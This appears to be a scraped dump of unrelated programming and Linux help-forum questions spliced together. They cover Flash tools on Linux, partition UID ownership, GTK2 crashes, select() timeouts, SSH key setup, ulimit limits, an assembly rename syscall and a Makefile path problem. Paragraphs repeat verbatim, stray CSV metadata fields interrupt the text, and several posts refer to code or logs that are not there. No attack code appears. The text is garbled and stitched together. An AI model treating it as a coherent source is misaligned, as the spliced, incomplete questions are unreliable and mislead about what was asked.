I'm trying to help a friend debugging his Flash animation. Now, when I'm at his place and at his MacBook, he's using Adobe Flash to create his animation, with those timelines, the AS3 editor, etc.

Now, I want to help him while I'm at home, but I don't have a Windows or Mac computer, and I don't have a Flash license (he's got his from the school he's going to).

I know about [osflash.org], but can I work the same way as he does in Flash? I need those timelines, and obviously I need to compile and preview the `.swf` files.

I should explain, I've never worked with Flash before, and the IDE is quite weird to me. The only way I help him, is by providing general programming skills (since AS3 is just another OO language). I was thinking of installing a cracked Flash version in a Windows VM, but that's not how I'd like to work.

Is there a better solution to this?

When it is mounted, listing this partition looks like this in Ubuntu: 

    $ ls -la /media/myhdrive/
    total 5743740
    drwxr-xr-x  8 myusername myusername       4096 2011-07-21 08:19 .

    -rw-r--r--  1 myusername myusername       3463 2011-07-21 08:19 file2.txt

Now, let's say I shutdown the Ubuntu OS - and boot, let's say, OpenSUSE from a USB key on the same machine. The `myhdrive` partition will again not be automounted, and then I have to mount it manually (again from the file manager there). The thing is, when mounted under OpenSUSE, the same drive displays the following listing: 

    $ ls -la /media/myhdrive/
    total 5743740
    drwxr-xr-x  8 1000 1000       4096 2011-07-21 08:19 .

    -rw-r--r--  1 1000 1000       3463 2011-07-21 08:19 file2.txt

Obviously, `myusername` has uid of 1000 in the Ubuntu system, and there it is recognized - while the same username is not present in the OpenSUSE system, and so the uid is not replaced with a filename. 

The problem is, of course, that I cannot write to the `myhdrive` from OpenSUSE by default - I'd first have to `chown` the entire partition - and then, when I get back to the Ubuntu system, I'd have to `chown` it back again. 

It's quite clear to me that this will not be possible using the GUI tools - but is there a method or a command line switch, such that I can ""fake ownership"": mount this partition in such a way, that the real `uid` of 1000 is interpreted as 'the currently logged-in user' in the USB-booted case (including that, when writes are made to the partition by 'the currently logged-in user', they are recorded under the uid of 1000)? 

Thanks in advance for any answers,

Is it possible to convert the FAT32 into EXT2 and use it for further updates without losing the existing content?",2

I have just started looking into a large piece of multithreaded GTK2 application code which was developed and tested using GTK2-2.18.x (GTK2 version 2.18) on a proprietary system running Linux. 

I have upgraded GTK2 to version 2.22. I can’t upgrade to 2.24 or 3.0 as there are some issues with proprietary hardware which currently has drivers that work only with older X server and some older packages. 

After the upgrade from 2.18 to 2.22 I see random crashes in the GTK2 application. I believe that the crashes are due to heap corruption. The gdb stack trace shows the crash almost always to be inside a libc realloc function. But the GTK functions from the code that are called before the libc realloc crash vary.

I enabled MALLOC_CHECK_ and also enabled GTK_DEBUG. Below are the logs (taken from stderr) after 3 random crashes. I have also used valgrind without much success.

Has anyone seen these errors before? Appreciate any help in resolving this issue.

",linux,gtk,gtk2,,,,open,0,504,4,"GTK2 multthreaded app crash I am new to GTK. I have just started looking into a large piece of multithreaded GTK2 application code which was developed and tested using GTK2-2.18.x (GTK2 version 2.18) on a proprietary system running Linux. 

I have upgraded GTK2 to version 2.22. I can’t upgrade to 2.24 or 3.0 as there are some issues with proprietary hardware which currently has drivers that work only with older X server and some older packages. 

After the upgrade from 2.18 to 2.22 I see random crashes in the GTK2 application. I believe that the crashes are due to heap corruption. The gdb stack trace shows the crash almost always to be inside a libc realloc function. But the GTK functions from the code that are called before the libc realloc crash vary.

I enabled MALLOC_CHECK_ and also enabled GTK_DEBUG. Below are the logs (taken from stderr) after 3 random crashes. I have also used valgrind without much success.

Has anyone seen these errors before? Appreciate any help in resolving this issue.

I modify an example from Beej's tutorial in an attempt to figure it out. What I want to do in the for loop is at each iterations I wait for 4 seconds. If a read is available, I would print ""A key was pressed"" and if it timeout, then it would print ""Timed out."" Then I would clear the set and repeat the process 9 more times. But it seems that once file descriptor 0 is set, it never gets unset even after a call to `FD_ZERO()` and/or `FD_CLR()`. In other words after I press a key in the first iteration of the loop the file descriptor is set for the rest of the iterations and no more waiting is done.

      1.  On host_src, run this command as the user that runs scp/ssh/rsync    
          $ ssh-keygen -t rsa    
          This will prompt for a passphrase. Just press the enter key. It'll then generate   an identification (private key) and a public key. Do not ever share the private key with anyone! ssh-keygen shows where it saved the public key. This is by default ~/.ssh/id_rsa.pub:
    Your public key has been saved in <your_home_dir>/.ssh/id_rsa.pub
       2.Transfer the id_rsa.pub file to host_dest by either ftp, scp, rsync or any other method.
      3. On host_dest, login as the remote user which you plan to use when you run scp, ssh or rsync on host_src.
      4.Copy the contents of id_rsa.pub to ~/.ssh/authorized_keys
          $ cat id_rsa.pub >>~/.ssh/authorized_keys
          $ chmod 700 ~/.ssh/authorized_keys

It uses a single interpreter and so far works pretty well. It's a mixture of C, C#, Ruby, Python, Perl and even some PHP.
Normally I wouldn't have bothered with such an idea, but to make pen testing and linux administration easier I just had to. All of the above languages can perform these two, but I find some things easier from, say, Perl, then some from Ruby and some of these look good from PHP, if you know what I mean. Anyway, to make my like easier I created one and working on having functions for something that would normally take 50 lines of Ruby, then neatly packages it in a hash table for you. A WORKING example is below titled dnscheck.cx. It basically takes a domain name the user specifies from the command arguments and checks the MX records - priority and name, then the nameserver for the domain. There is some simple error checking in there also. `func main()` is always the constructor for this language and argv[], argc is automatically passed to it. You'll notice the ns_* functions. ns_mx() will get the MX records and add them to a hash table in the format of `hostname => priority` and ns_ns() will get the nameserver records - `nameserver => ipaddr`. It also uses `is_ip()` which will validate an ip address for you. Obviously it has others that aren't listed here like `md5()`, `sha2()`, `is_mail()` and many others.
Because they are held in hashes you can quite easily iterate through them with `foreach`.
Basically, I'm just wondering if anyone thinks this project is a good idea, or a complete waste of time. I understand other languages have frameworks and modules, but with this language it's all-in-one; no imports, no rubygems, no requires, no CPAN etc.
Any input is welcomed - Positive, or otherwise. Thanks a lot, and the working sample for dnscheck is below.

Normally I wouldn't have bothered with such an idea, but to make pen testing and linux administration easier I just had to. All of the above languages can perform these two, but I find some things easier from, say, Perl, then some from Ruby and some of these look good from PHP, if you know what I mean. Anyway, to make my like easier I created one and working on having functions for something that would normally take 50 lines of Ruby, then neatly packages it in a hash table for you. A WORKING example is below titled dnscheck.cx. It basically takes a domain name the user specifies from the command arguments and checks the MX records - priority and name, then the nameserver for the domain. There is some simple error checking in there also. `func main()` is always the constructor for this language and argv[], argc is automatically passed to it. You'll notice the ns_* functions. ns_mx() will get the MX records and add them to a hash table in the format of `hostname => priority` and ns_ns() will get the nameserver records - `nameserver => ipaddr`. It also uses `is_ip()` which will validate an ip address for you. Obviously it has others that aren't listed here like `md5()`, `sha2()`, `is_mail()` and many others.
Because they are held in hashes you can quite easily iterate through them with `foreach`.
Basically, I'm just wondering if anyone thinks this project is a good idea, or a complete waste of time. I understand other languages have frameworks and modules, but with this language it's all-in-one; no imports, no rubygems, no requires, no CPAN etc.
Any input is welcomed - Positive, or otherwise. Thanks a lot, and the working sample for dnscheck is below.

    
    func runScan(domain)
    {
         Console.Printf(""* Checking MX Records...\n"");
         mhash = ns_mx(domain);
         if (!mhash)
         {
             Console.Printf(""Problem getting mail records for %s\n"", domain);
             System.exit(1);
         }
         foreach(mhash as s,p)
         {
             Console.Printf(""%d - %s\n"",p,s);
         }
         Console.Printf(""* Checking Nameservers...\n"");
         nhash = ns_ns(domain);
         if (!nhash)
         {
             Console.Printf(""Could not retrieve nameservers for %s\n"", domain);
             System.exit(1);
         }
         foreach(nhash as n,a)
         {
             Console.Printf(""%s - %s\n"",n,str(a));
         }

I'm trying to increase the number of open files allowed for a user. This is for an my ecplise java application where the current limit of 1024 is not enough.

According to the posts I've found so far, I should be able to put lines into 

/etc/security/limits.conf like this;


    soft nofile 4096
    hard nofile 4096

to increase the number of open files allowed for all users.

But, that's not working for me, and I think the problem is not related to that file.

For all users, the default limit is 1024, regardless of what is in /etc/security/limits.conf (I have been rebooting after changing that file)

    $ ulimit -n
    1024

Now, despite the entries in /etc/security/limits.conf I can't increase that;



    $ ulimit -n 2048

-bash: ulimit: open files: cannot modify limit: Operation not permitted
The weird part is that I can change the limit *downwards*, but can't change it upwards - even to go back to a number which is below the original limit;

    $ ulimit -n 800
    $ ulimit -n
    800
    
    $ ulimit -n 900

    -bash: ulimit: open files: cannot modify limit: Operation not permitted

As root, I can change that limit to whatever I want, up or down. It doesn't even seem to care about the supposedly system-wide limit in /proc/sys/fs/file-max

Let me explain it: This program calls syscall `rename` to rename file `/tmp/a` to `/tmp/b` The string in section .data contains name of the source file and name of the target file.

Because I want to avoid NULLs, I decided to put # instead of NULLs and change it on runtime. However, the program terminates with SEGFAULT. It really seems that there is a problem with character substitution in .data segment. My question is - how should I deal with it and make it work? I know it's a beginner question, maybe I'm missing something very important.

Thanks for any advice.

Of note there are places in the code above where the line of code breaks because of the size of the code box.  

My main question probably has more to do with the first portion.  I changed the ROOT directory to match my own however upon doing so I am still getting the 

*** No rule to make target 'scp.f90', needed by 'scp.o'. Stop. 

I assumed this meant that it was not looking in the correct directories for the needed files.  I sort of confirmed this with myself by actually just putting all the necessary files in one folder and putting the makefile in there.  I then stopped getting the above error and instead got a compiler error which I was expecting as the compilers used in the Makefile are different from the ones on my machine.  So something is wrong with how I am specifying the directory.  I am not an expert programmer and sort of learning on the fly so the answer may be very obvious.

Of note there are places in the code above where the line of code breaks because of the size of the code box.  

My main question probably has more to do with the first portion.  I changed the ROOT directory to match my own however upon doing so I am still getting the 

*** No rule to make target 'scp.f90', needed by 'scp.o'. Stop. 

I assumed this meant that it was not looking in the correct directories for the needed files.  I sort of confirmed this with myself by actually just putting all the necessary files in one folder and putting the makefile in there.  I then stopped getting the above error and instead got a compiler error which I was expecting as the compilers used in the Makefile are different from the ones on my machine.  So something is wrong with how I am specifying the directory.  I am not an expert programmer and sort of learning on the fly so the answer may be very obvious.

The free software floating around is usually about at the top of the dependency tree. That means a tremendous amount of tracking to install all the dependencies, and they usually fail to integrate pretty well. Then I discovered macports. That got me a lot farther, but I found that a good chuck of the software just seemed to prefer linux. So I got Virtualbox, installed a bunch of virtual linux distributions, and compared their support for scientific programs. In the end, Debian won, and I still cannot decide what order to put the rest in.

Then I started reading about this mysterious ""BSD"" operating system, and found claims that it was a close second to Debian in software support, has a nice linux emulator, and only has three main distributions. Plus, it seems that most software that is compatible with one is compatible with the other two. I looked back at some of the software I installed, and a few of them had BSD versions. I wonder whether the others would work under BSD's linux emulator.

So, after reading much very subjective debate over the differences it seems the question is FreeBSD or Debian--but I could be wrong. I have yet to find any indication as to what would have maximum support for scientific (or any) free software.

So here are some short gauging questions:
What are the odds that
A X operating system can run a software built for Y?
Where X and Y are elements of: {debian based, red hat based, BSD based, proprietary (OSX, Windows...)}
and X!=Y.

and specifically, is it more likely that X will be compatibly with Y but Y not compatible with X (like Debian running Ubuntu software but Ubuntu not running Debian software)?

Also, 
Which OS (other than Windows) do people generally first want their free software to be compatible with? I am guessing linux. Ok, what distro?


I appreciate any (non inflammatory) help.
